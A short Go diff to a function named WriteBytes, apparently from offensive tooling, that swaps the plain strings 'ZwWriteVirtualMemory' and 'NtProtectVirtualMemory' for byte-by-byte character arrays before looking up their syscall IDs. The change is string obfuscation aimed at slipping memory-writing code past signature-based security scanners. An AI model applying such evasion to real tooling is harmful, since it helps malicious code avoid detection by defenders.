@@ -25,12 +25,12 @@ func WriteBytes(module string, proc string, data *[]byte) error {
     return err
   }
   
-  ZwWriteVirtualMemory, err := GetSysId("ZwWriteVirtualMemory")
+  ZwWriteVirtualMemory, err := GetSysId(string([]byte{'Z','w','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y'}))
   if err != nil {
     return err
   }
 
-  NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
+  NtProtectVirtualMemory, err := GetSysId(string([]byte{'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y'}))
   if err != nil {
     return err
   }
